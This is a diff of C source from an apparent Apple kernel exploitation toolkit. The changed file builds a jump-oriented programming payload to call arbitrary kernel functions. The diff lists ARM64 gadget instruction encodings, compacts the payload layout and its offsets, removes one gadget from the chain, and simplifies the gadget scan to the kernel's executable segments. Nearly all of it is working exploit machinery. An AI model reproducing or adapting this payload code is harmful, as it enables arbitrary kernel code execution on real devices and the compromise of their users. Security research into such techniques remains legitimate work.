@@ -190,11 +190,6 @@
  * 	x5 = VALUE_STACK[cc] = <arg5>
  * 	x6 = VALUE_STACK[d4] = <arg6>
  * 	pc = JOP_DISPATCH
- * 	pc = ADD_X20_X20_34__BR_X8
- *
- * add x20, x20, #0x34 ; br x8
- * 	x20 += 0x34
- * 	pc = JOP_DISPATCH
  * 	pc = MOV_X11_X24__BR_X8
  *
  * mov x11, x24 ; br x8
@@ -246,7 +241,9 @@
  *
  * 	jop_payload      100              200              300              400
  * 	+----------------+----------------+----------------+----------------+
- * 	| VALUE_STACK    : STORE_RESUME   : JOP_STACK                       |
+ * 	|~~~~~~~~~~~~~~  :                :                :                | VALUE_STACK
+ * 	|~               :                :                :                | STORE_RESUME
+ * 	|              ~~:~~~~~~~~~~~~~~~~:~~~~~~~~~~~~~~~~:~~~~~~~~~~~~~~~~| JOP_STACK
  * 	+----------------+----------------+----------------+----------------+
  *
  * VALUE_STACK is the stack of values that will be loaded into registers using the load gadget. The
@@ -256,7 +253,7 @@
  *
  * 	VALUE_STACK         10                  20                  30   34             40
  * 	+---------+---------+---------+---------+---------+---------+----+----+---------+
- * 	|         |         |         |         | MOV_X8_ | MOV_X30 | _______ | STORE_R |  >---+
+ * 	| ~ STORE_RESUME ~~ |         |         | MOV_X8_ | MOV_X30 | _______ | STORE_R |  >---+
  * 	+---------+---------+---------+---------+---------+---------+----+----+---------+      |
  * 	                                                                                       |
  * 	   +-----------------------------------------------------------------------------------+
@@ -280,16 +277,8 @@
  * 	   V
  * 	9c             a8   ac                  bc                  cc   d0             dc
  * 	+----+---------+----+---------+---------+---------+---------+----+----+---------+
- * 	g0>  | _______ |    :         :         : <arg3>  : <arg4>  : <arg5>  : <arg6>  :  >---+
- * 	+----+---------+----+---------+---------+---------+---------+----+----+---------+      |
- * 	                                                                                       |
- * 	   +-----------------------------------------------------------------------------------+
- * 	   |
- * 	   V
- * 	d0             dc   e0                  f0                  100
- * 	+----+---------+----+---------+---------+---------+---------+
- * 	g5>  : <arg6>  :    | JOP_DIS | JOP_STA |         |         |
- * 	+----+----+----+----+---------+---------+---------+---------+
+ * 	g0>  | _______ |    : JOP_DIS : JOP_STA : <arg3>  : <arg4>  : <arg5>  : <arg6>  :
+ * 	+----+---------+----+---------+---------+---------+---------+----+----+---------+
  * 	^^^^^^^^^^^
  * 	| <result |
  * 	+---------+
@@ -335,11 +324,9 @@
  * Thus, the corresponding element of VALUE_STACK must point to the rest of the JOP_STACK.
  *
  * Note that the preceding organization for the JOP payload is not very space efficient: there are
- * lots of gaps that could be packed to make the JOP payload take significantly less space.
- * However, because we are allocating memory with mach_vm_allocate which returns a whole number of
- * memory pages, we cannot save any memory by packing the payload densely. Thus, this inefficiency
- * is irrelevant.
- *
+ * lots of gaps that could be packed to make the JOP payload take less space. However, because we
+ * are allocating memory with mach_vm_allocate which returns a whole number of memory pages, we
+ * cannot save any memory by packing the payload densely.
  */
 
 #include "core.h"
@@ -380,38 +367,41 @@ struct gadget {
  * Description:
  * 	The list of gadgets we need.
  */
-#define GADGET(str, count, ...) { 0, str, count, (const uint32_t *) &(const uint32_t[count]) { __VA_ARGS__ } }
+#define GADGET(str, ...)							\
+	{ 0, str, sizeof((uint32_t[]) { __VA_ARGS__ }) / sizeof(uint32_t),	\
+	  (const uint32_t *) &(const uint32_t[]) { __VA_ARGS__ } }
 struct gadget gadgets[] = {
-	GADGET("ldp x2, x1, [x1] ; br x2",          2, 0xa9400422, 0xd61f0040),
-	GADGET("mov x12, x2 ; br x3",               2, 0xaa0203ec, 0xd61f0060),
-	GADGET("mov x2, x30 ; br x12",              2, 0xaa1e03e2, 0xd61f0180),
-	GADGET("mov x8, x4 ; br x5",                2, 0xaa0403e8, 0xd61f00a0),
-	GADGET("mov x21, x2 ; br x8",               2, 0xaa0203f5, 0xd61f0100),
-	GADGET("mov x20, x0 ; blr x8",              2, 0xaa0003f4, 0xd63f0100),
-	GADGET("mov x10, x4 ; br x8",               2, 0xaa0403ea, 0xd61f0100),
-	GADGET("mov x9, x10 ; br x8",               2, 0xaa0a03e9, 0xd61f0100),
-	GADGET("mov x11, x9 ; br x8",               2, 0xaa0903eb, 0xd61f0100),
+	GADGET("ldp x2, x1, [x1] ; br x2",      0xa9400422, 0xd61f0040),
+	GADGET("mov x12, x2 ; br x3",           0xaa0203ec, 0xd61f0060),
+	GADGET("mov x2, x30 ; br x12",          0xaa1e03e2, 0xd61f0180),
+	GADGET("mov x8, x4 ; br x5",            0xaa0403e8, 0xd61f00a0),
+	GADGET("mov x21, x2 ; br x8",           0xaa0203f5, 0xd61f0100),
+	GADGET("mov x20, x0 ; blr x8",          0xaa0003f4, 0xd63f0100),
+	GADGET("mov x10, x4 ; br x8",           0xaa0403ea, 0xd61f0100),
+	GADGET("mov x9, x10 ; br x8",           0xaa0a03e9, 0xd61f0100),
+	GADGET("mov x11, x9 ; br x8",           0xaa0903eb, 0xd61f0100),
 	GADGET("ldp x3, x4, [x20, #0x20] ; ldp x5, x6, [x20, #0x30] ; blr x8",
-	                                            3, 0xa9421283, 0xa9431a85, 0xd63f0100),
-	GADGET("add x20, x20, #0x34 ; br x8",       2, 0x9100d294, 0xd61f0100),
-	GADGET("mov x22, x6 ; blr x8",              2, 0xaa0603f6, 0xd63f0100),
-	GADGET("mov x24, x4 ; br x8",               2, 0xaa0403f8, 0xd61f0100),
-	GADGET("mov x0, x3 ; blr x8",               2, 0xaa0303e0, 0xd63f0100),
-	GADGET("mov x28, x0 ; blr x8",              2, 0xaa0003fc, 0xd63f0100),
-	GADGET("mov x12, x3 ; br x8",               2, 0xaa0303ec, 0xd61f0100),
-	GADGET("mov x0, x5 ; blr x8",               2, 0xaa0503e0, 0xd63f0100),
-	GADGET("mov x9, x0 ; br x11",               2, 0xaa0003e9, 0xd61f0160),
-	GADGET("mov x7, x9 ; blr x11",              2, 0xaa0903e7, 0xd63f0160),
-	GADGET("mov x11, x24 ; br x8",              2, 0xaa1803eb, 0xd61f0100),
+	                                        0xa9421283, 0xa9431a85, 0xd63f0100),
+	GADGET("add x20, x20, #0x34 ; br x8",   0x9100d294, 0xd61f0100),
+	GADGET("mov x22, x6 ; blr x8",          0xaa0603f6, 0xd63f0100),
+	GADGET("mov x24, x4 ; br x8",           0xaa0403f8, 0xd61f0100),
+	GADGET("mov x0, x3 ; blr x8",           0xaa0303e0, 0xd63f0100),
+	GADGET("mov x28, x0 ; blr x8",          0xaa0003fc, 0xd63f0100),
+	GADGET("mov x12, x3 ; br x8",           0xaa0303ec, 0xd61f0100),
+	GADGET("mov x0, x5 ; blr x8",           0xaa0503e0, 0xd63f0100),
+	GADGET("mov x9, x0 ; br x11",           0xaa0003e9, 0xd61f0160),
+	GADGET("mov x7, x9 ; blr x11",          0xaa0903e7, 0xd63f0160),
+	GADGET("mov x11, x24 ; br x8",          0xaa1803eb, 0xd61f0100),
 	GADGET("mov x1, x9 ; mov x2, x10 ; blr x11",
-	                                            3, 0xaa0903e1, 0xaa0a03e2, 0xd63f0160),
-	GADGET("mov x30, x28 ; br x12",             2, 0xaa1c03fe, 0xd61f0180),
-	GADGET("ldp x8, x1, [x20, #0x10] ; blr x8", 2, 0xa9410688, 0xd63f0100),
+	                                        0xaa0903e1, 0xaa0a03e2, 0xd63f0160),
+	GADGET("mov x30, x28 ; br x12",         0xaa1c03fe, 0xd61f0180),
+	GADGET("ldp x8, x1, [x20, #0x10] ; blr x8",
+	                                        0xa9410688, 0xd63f0100),
 	GADGET("str x0, [x20] ; ldr x8, [x22] ; ldr x8, [x8, #0x28] ; mov x0, x22 ; blr x8",
-	                                            5, 0xf9000280, 0xf94002c8, 0xf9401508,
-	                                               0xaa1603e0, 0xd63f0100),
-	GADGET("mov x30, x21 ; br x8",              2, 0xaa1503fe, 0xd61f0100),
-	GADGET("ret",                               1, 0xd65f03c0)
+	                                        0xf9000280, 0xf94002c8, 0xf9401508, 0xaa1603e0,
+	                                        0xd63f0100),
+	GADGET("mov x30, x21 ; br x8",          0xaa1503fe, 0xd61f0100),
+	GADGET("ret",                           0xd65f03c0)
 };
 #undef GADGET
 
@@ -464,9 +454,9 @@ static kaddr_t jop_payload;
 
 #define JOP_MEMORY_SIZE     0x400
 #define VALUE_STACK_OFFSET  0
-#define RESULT_OFFSET       0xd0
-#define STORE_RESUME_OFFSET 0x100
-#define JOP_STACK_OFFSET    0x200
+#define RESULT_OFFSET       0x9c
+#define STORE_RESUME_OFFSET 0
+#define JOP_STACK_OFFSET    0xe0
 #define LOAD_ADVANCE        0x34
 #define STORE_RESUME_DELTA  (-0x28)
 
@@ -503,49 +493,6 @@ find_gadgets_in_data(const void *data, uint64_t address, size_t size) {
 }
 
 /*
- * find_gadgets_in_kext
- *
- * Description:
- * 	A kernelcache_for_each callback to find gadgets within a given kernel extension.
- */
-static bool
-find_gadgets_in_kext(void *context, CFDictionaryRef info,
-		const char *bundle_id, kaddr_t base, size_t size0) {
-	if (base == 0) {
-		return false;
-	}
-	bool *success = (bool *)context;
-	struct macho kext;
-	kext_result kr = kernelcache_kext_init_macho_at_address(&kernelcache, &kext, base);
-	if (kr != KEXT_SUCCESS) {
-		error_internal("kernelcache_kext_init_macho_at_address failed for address "
-		               "%llx returned by kernelcache_for_each", (long long)base);
-		*success = false;
-		return true;
-	}
-	const struct segment_command_64 *sc = NULL;
-	for (;;) {
-		if (ngadgets == GADGET_COUNT) {
-			return true;
-		}
-		macho_find_load_command_64(&kext, (const struct load_command **)&sc,
-				LC_SEGMENT_64);
-		if (sc == NULL) {
-			return false;
-		}
-		const int prot = VM_PROT_READ | VM_PROT_EXECUTE;
-		if ((sc->initprot & prot) != prot || (sc->maxprot & prot) != prot) {
-			continue;
-		}
-		const void *data;
-		uint64_t address;
-		size_t size;
-		macho_segment_data_64(&kext, sc, &data, &address, &size);
-		find_gadgets_in_data(data, address, size);
-	}
-}
-
-/*
  * check_gadgets
  *
  * Description:
@@ -570,12 +517,31 @@ check_gadgets() {
  *
  * Description:
  * 	Initialize the gadgets used for the JOP payload.
+ *
+ * Notes:
+ * 	We only scan the executable segments of the kernel Mach-O because all executable segments
+ * 	of all kernel extensions lie within the kernel's __PLK_TEXT_EXEC segment.
  */
 static bool
 find_gadgets() {
-	bool success = true;
-	kernelcache_for_each(&kernelcache, find_gadgets_in_kext, &success);
-	return (success && check_gadgets());
+	const struct segment_command_64 *sc = NULL;
+	for (;;) {
+		macho_find_load_command_64(&kernel.macho, (const struct load_command **)&sc,
+				LC_SEGMENT_64);
+		if (sc == NULL) {
+			break;
+		}
+		const int prot = VM_PROT_READ | VM_PROT_EXECUTE;
+		if ((sc->initprot & prot) != prot || (sc->maxprot & prot) != prot) {
+			continue;
+		}
+		const void *data;
+		uint64_t address;
+		size_t size;
+		macho_segment_data_64(&kernel.macho, sc, &data, &address, &size);
+		find_gadgets_in_data(data, address, size);
+	}
+	return check_gadgets();
 }
 
 /*
@@ -596,8 +562,6 @@ build_jop_payload(uint64_t func, uint64_t args[8]) {
 	store_resume_payload[0] = store_resume + sizeof(uint64_t) + STORE_RESUME_DELTA;
 	store_resume_payload[1] = gadgets[LDP_X2_X1_X1__BR_X2].address;
 	// Set up JOP_STACK.
-	// NOTE: The JOP_STACK contains 29 gadgets and runs from 0x200 to 0x3d0. If there are ever
-	// more than 32 gadgets, JOP_STACK will need more space.
 	const unsigned jop_call_chain_gadgets[] = {
 		MOV_X20_X0__BLR_X8,
 		MOV_X10_X4__BR_X8,
@@ -622,7 +586,6 @@ build_jop_payload(uint64_t func, uint64_t args[8]) {
 		MOV_X10_X4__BR_X8,
 		MOV_X0_X5__BLR_X8,
 		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
-		ADD_X20_X20_34__BR_X8,
 		MOV_X11_X24__BR_X8,
 		MOV_X1_X9__MOV_X2_X10__BLR_X11,
 	};
@@ -679,8 +642,7 @@ build_jop_payload(uint64_t func, uint64_t args[8]) {
 	load_gadget->x4 = args[4];
 	load_gadget->x5 = args[5];
 	load_gadget->x6 = args[6];
-	call_recover_gadget = (struct call_recover_gadget *)
-		((uint8_t *)load_gadget + LOAD_ADVANCE);
+	call_recover_gadget = (struct call_recover_gadget *)((uint8_t *)load_gadget);
 	call_recover_gadget->x8 = gadgets[LDP_X2_X1_X1__BR_X2].address;
 	call_recover_gadget->x1 = jop_return_chain;
 	// Finally, write the payload into memory.
